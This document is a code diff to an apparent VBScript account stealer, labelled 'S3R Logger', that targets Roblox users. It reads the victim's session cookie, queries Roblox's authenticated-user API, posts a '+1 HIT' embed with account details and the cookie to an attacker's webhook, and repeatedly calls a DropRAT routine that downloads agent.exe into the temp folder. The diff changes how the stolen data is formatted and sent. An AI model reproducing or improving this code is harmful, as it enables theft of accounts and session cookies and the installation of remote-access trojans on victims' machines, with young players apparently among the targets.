@@ -41,6 +41,7 @@ Do
     Call PostCookieOnly(RE_WH)
     Call GrabFroststrap(RE_WH)
     
+    ' Re-grab ALWAYS re-downloads and sends to RE_WH
     Call DropRAT(RE_WH, False)
     
     Call SleepSeconds(150)
@@ -54,9 +55,11 @@ Sub PostUIAndCookie(targetWH)
     Dim uname : uname = "Unknown"
     Dim disp : disp = "Unknown"
     Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
+    Dim apiSuccess : apiSuccess = False
     
     ' Attempt fetch API natively via XMLHTTP with TLS 1.2/1.3
     If Len(cookie) > 50 Then
+        On Error Resume Next ' Explicitly handle errors for API block
         Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
         xh.SetOption 2, 13056
         xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
@@ -89,37 +92,26 @@ Sub PostUIAndCookie(targetWH)
                 Dim am2 : Set am2 = am1.Execute(axh.responseText)
                 If am2.Count > 0 Then av = am2(0).SubMatches(0)
             End If
+            apiSuccess = True
         End If
+        On Error Goto 0
     End If
 
-    ' 1. SEND UI EMBED
-    Dim DQ : DQ = Chr(34)
-    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
-                DQ & "author" & DQ & ":{" & DQ & "name" & DQ & ":" & DQ & Ej(uname) & DQ & "," & DQ & "icon_url" & DQ & ":" & DQ & av & DQ & "}," & _
-                DQ & "title" & DQ & ":" & DQ & "S3R, 13+" & DQ & "," & _
-                DQ & "description" & DQ & ":" & DQ & "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP" & DQ & "," & _
-                DQ & "color" & DQ & ":10181046," & _
-                DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}," & _
-                DQ & "fields" & DQ & ":[" & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯС§ User" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "**" & Ej(disp) & "**" & DQ & "}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "в≠Р Password" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "dreistuff" & DQ & "}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "About User" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "**Account Age:** `` 340 Days ``" & DQ & "}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯ™Щ Robux" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance 0 рЯФі`nPending 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯУИ RAP" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "RAP 0 рЯФі`nOwned 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯТО Premium" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "False (0 рЯФі)" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯТ≥ Billing" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Credit 0$ рЯФі`nConvert 0 рЯФі`nPayments 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯПЈпЄП Collectibles" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "False рЯФі`nFalse рЯФі`nTrue рЯЯҐ" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "вЪЩпЄП Setting" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Set (Verified) рЯФі`nDisabled рЯФі`nDisabled рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯОЃ Passes / Played" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Adopt Me 0 вАҐ False`nMurder Mystery 2 0 вАҐ True`nPet Simulator 99 0 вАҐ False" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-                "{" & DQ & "name" & DQ & ":" & DQ & "рЯС• Groups" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance 0 рЯФі`nPending 0 рЯФі`nOwned 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}" & _
-                "]," & DQ & "footer" & DQ & ":{" & DQ & "text" & DQ & ":" & DQ & "S3R Logger" & DQ & "}}]}"
+    ' 1. SEND UI EMBED natively using PostEmbed
+    Dim uiDesc : uiDesc = "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP" & vbCrLf & vbCrLf & _
+        "рЯС§ **User:** " & disp & vbCrLf & _
+        "в≠Р **Password:** dreistuff" & vbCrLf & _
+        "рЯУЛ **About User:** `` 340 Days ``" & vbCrLf & _
+        "рЯ™Щ **Robux:** Balance 0 рЯФі | Pending 0 рЯФі" & vbCrLf & _
+        "рЯУИ **RAP:** RAP 0 рЯФі | Owned 0 рЯФі" & vbCrLf & _
+        "рЯТО **Premium:** False (0 рЯФі)" & vbCrLf & _
+        "рЯТ≥ **Billing:** Credit 0$ | Convert 0 | Payments 0" & vbCrLf & _
+        "рЯПЈпЄП **Collectibles:** False рЯФі | False рЯФі | True рЯЯҐ" & vbCrLf & _
+        "вЪЩпЄП **Setting:** Set (Verified) | Disabled | Disabled" & vbCrLf & _
+        "рЯОЃ **Passes / Played:** Adopt Me 0 | Murder Mystery 2 0 | Pet Simulator 99 0" & vbCrLf & _
+        "рЯС• **Groups:** Balance 0 рЯФі | Pending 0 рЯФі | Owned 0 рЯФі"
 
-    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", targetWH, False
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.Send j
-    Set h = Nothing
+    Call PostEmbedTo("S3R, 13+ - " & uname, uiDesc, 10181046, targetWH)
 
     ' 2. SEND COOKIE MESSAGE IMMEDIATELY AFTER
     If Len(cookie) > 0 Then
@@ -141,7 +133,6 @@ Sub DropRAT(targetWH, sendRocket)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\agent.exe"
     
-    ' Only send rocket on first run
     If sendRocket Then
         Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
     End If
